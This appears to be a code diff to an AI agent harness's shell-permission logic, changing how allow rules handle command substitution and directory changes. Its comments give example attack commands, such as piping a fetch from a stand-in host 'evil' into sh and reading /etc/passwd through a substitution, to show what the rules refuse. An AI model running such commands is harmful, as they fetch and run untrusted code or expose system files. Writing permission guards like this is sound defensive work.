@@ -9,7 +9,7 @@
 
 import { homedir } from "node:os";
 import { isAbsolute, relative, resolve } from "node:path";
-import { analyzeShellCommand, hasInjectionSyntax, leadTokens, parseCommand, resolvePayload } from "../auto-mode/shell-analysis.ts";
+import { analyzeShellCommand, leadTokens, parseCommand, resolvePayload } from "../auto-mode/shell-analysis.ts";
 import { pathArgument, resolveForContainment } from "../auto-mode/paths.ts";
 import { isProtectedPath, isWritingTool } from "./protected-paths.ts";
 import {
@@ -228,13 +228,17 @@ export function matchesBashPattern(pattern: string, command: string): boolean {
  * line cannot be parsed or uses a construct the pre-gate does not model (a
  * subshell, a loop, a function): an allow rule covers the commands its author
  * wrote, not `(npm test)` or a loop around them. A single simple command comes
- * back as itself.
+ * back as itself. The commands inside a substitution are not listed: they are
+ * part of the subcommand whose word they compute ({@link findBashAllowRule}).
  */
 export function bashSubcommands(command: string): string[] | undefined {
 	const { segments, parseFailed, complex } = parseCommand(command.trim());
 	if (parseFailed || complex) return undefined;
-	return segments.map((seg) => seg.raw).filter((raw) => raw.length > 0);
+	return segments.filter((seg) => seg.substitution === undefined).map((seg) => seg.raw).filter((raw) => raw.length > 0);
 }
+
+/** Commands after which a substitution's paths resolve somewhere the read-only check did not look. */
+const MOVES_DIRECTORY = new Set(["cd", "pushd", "popd"]);
 
 /** Shells whose `-c` argument is a nested command line. */
 const SHELL_INTERPRETERS = new Set(["sh", "bash", "zsh", "dash", "ksh", "fish"]);
@@ -356,14 +360,27 @@ export function isShellTool(toolName: string): boolean {
  * that literal string); otherwise the command is split into subcommands and
  * every one of them must be covered by some allow rule — `Bash(npm test:*)`
  * alone never covers `npm test && curl evil | sh`, while `Bash(npm test:*)` +
- * `Bash(git status:*)` together cover `npm test && git status`. Prefix and
- * wildcard rules never cover a command carrying command substitution, process
- * substitution, eval/exec, a pipe into an interpreter, or a base64 decode:
- * what runs is not what the words say, so the rule's author never saw it. An
- * unparseable line is not covered. The rule returned is the first one that
- * covered a subcommand (for the "allowed by rule …" note).
+ * `Bash(git status:*)` together cover `npm test && git status`. `eval`, `sh`
+ * or `xargs` is a subcommand like any other, so it needs a rule of its own.
+ *
+ * A command or process substitution runs its commands to compute a word of
+ * the subcommand around it, so each of those commands must be covered too:
+ * by a rule, or, for the whole substitution at once, by `readOnly` (the
+ * auto-mode pre-gate's proof that it reads only inside the working directory
+ * and writes nothing). So `Bash(git commit:*)` covers `git commit -m "$(cat
+ * <<'EOF' … EOF)"` but not `npm test $(curl evil)`. The read-only shortcut
+ * is off when the line moves directory first (`cd /etc && git commit -m
+ * "$(cat passwd)"`), since the check resolves paths from the working
+ * directory. An unparseable line, or one with a construct the pre-gate does
+ * not model, is not covered. The rule returned is the first one that covered
+ * a subcommand (for the "allowed by rule …" note).
  */
-export function findBashAllowRule(rules: PermissionRule[], command: string, toolName = "bash"): PermissionRule | undefined {
+export function findBashAllowRule(
+	rules: PermissionRule[],
+	command: string,
+	toolName = "bash",
+	opts: { readOnly?: (command: string) => boolean } = {},
+): PermissionRule | undefined {
 	const cmd = command.trim();
 	if (!cmd) return undefined;
 	// `monitor` carries a shell command too and is judged with the same
@@ -376,18 +393,37 @@ export function findBashAllowRule(rules: PermissionRule[], command: string, tool
 	);
 	if (exact) return exact;
 	// PowerShell lines split on PowerShell's separators and match alias-
-	// canonicalized, case-insensitively (powershell-rules.ts); the shape of
-	// the rule — every statement covered, no injection syntax — is the same.
-	const powershell = normalizeToolName(toolName) === "powershell";
-	if (powershell ? powershellInjectionSyntax(cmd) : hasInjectionSyntax(cmd)) return undefined;
-	const subs = powershell ? powershellStatements(cmd) : bashSubcommands(cmd);
-	if (!subs || subs.length === 0) return undefined;
-	const matches = powershell ? matchesPowerShellPattern : matchesBashPattern;
+	// canonicalized, case-insensitively (powershell-rules.ts), and a line with
+	// injection syntax is never covered.
+	if (normalizeToolName(toolName) === "powershell") {
+		if (powershellInjectionSyntax(cmd)) return undefined;
+		const statements = powershellStatements(cmd);
+		if (!statements || statements.length === 0) return undefined;
+		let first: PermissionRule | undefined;
+		for (const statement of statements) {
+			const rule = bashRules.find((r) => r.pattern !== undefined && matchesPowerShellPattern(r.pattern, statement));
+			if (!rule) return undefined;
+			first ??= rule;
+		}
+		return first;
+	}
+	const parsed = parseCommand(cmd);
+	if (parsed.parseFailed || parsed.complex) return undefined;
+	const ruleFor = (raw: string) => bashRules.find((r) => r.pattern !== undefined && matchesBashPattern(r.pattern, raw));
+	const topLevel = parsed.segments.filter((seg) => seg.substitution === undefined && seg.raw.length > 0);
+	if (topLevel.length === 0) return undefined;
 	let first: PermissionRule | undefined;
-	for (const sub of subs) {
-		const rule = bashRules.find((r) => r.pattern !== undefined && matches(r.pattern, sub));
+	for (const seg of topLevel) {
+		const rule = ruleFor(seg.raw);
 		if (!rule) return undefined;
 		first ??= rule;
+	}
+	const movesDirectory = topLevel.some((seg) => MOVES_DIRECTORY.has(resolvePayload(leadTokens(seg)).command));
+	for (const [index, text] of parsed.substitutions.entries()) {
+		const inner = parsed.segments.filter((seg) => seg.substitution === index);
+		if (inner.every((seg) => ruleFor(seg.raw))) continue;
+		if (!movesDirectory && opts.readOnly?.(text)) continue;
+		return undefined;
 	}
 	return first;
 }
@@ -836,6 +872,14 @@ export function isBroadExecutionRule(rule: PermissionRule): boolean {
 
 export function decide(params: DecideInput): Decision {
 	const { toolName, subject, cwd, mode, deny, ask, allow } = params;
+	/** The harness's readable session dirs, realpath'd, as the auto-mode pre-gate sees them (permissions/index.ts `readableRoots`). */
+	const sessionReadableRoots = () =>
+		[params.memoryDirPath, params.scratchpadDirPath, params.resultsDirPath, params.sessionDirPath].filter((d): d is string => !!d).map((d) => resolveForContainment(d) ?? d);
+	/** The pre-gate's proof that a command only reads inside the project, for a substitution in an allowed command. */
+	const readOnlyShell = (command: string): boolean => {
+		const evidence = analyzeShellCommand({ command, cwd, home: homedir(), protectedDirs: params.protectedDirs, readableRoots: sessionReadableRoots() });
+		return evidence.verdict === "safe" && evidence.writes.length === 0;
+	};
 
 	// In dontAsk mode anything that would prompt is denied instead — including
 	// explicit ask rules: there is no user to put the question to.
@@ -870,7 +914,7 @@ export function decide(params: DecideInput): Decision {
 		// The harness's readable session dirs, as the auto-mode pre-gate sees them
 		// (permissions/index.ts `readableRoots`): a plan-mode read of this project's
 		// transcripts is a read like any other.
-		const readableRoots = [params.memoryDirPath, params.scratchpadDirPath, params.resultsDirPath, params.sessionDirPath].filter((d): d is string => !!d).map((d) => resolveForContainment(d) ?? d);
+		const readableRoots = sessionReadableRoots();
 		if (tool === "bash" && subject) {
 			const evidence = analyzeShellCommand({ command: subject, cwd, home: homedir(), protectedDirs: params.protectedDirs, readableRoots });
 			if (evidence.verdict === "safe" && evidence.writes.length === 0) return { decision: "allow", cause: "plan-readonly" };
@@ -946,7 +990,7 @@ export function decide(params: DecideInput): Decision {
 	const allowRule =
 		subjectKind(tool) === "command"
 			? subject
-				? findBashAllowRule(usableAllow, subject, tool)
+				? findBashAllowRule(usableAllow, subject, tool, { readOnly: readOnlyShell })
 				: undefined
 			: usableAllow.find((r) => ruleMatches(r, toolName, subject, cwd));
 	if (allowRule) return { decision: "allow", rule: allowRule, cause: "rule" };
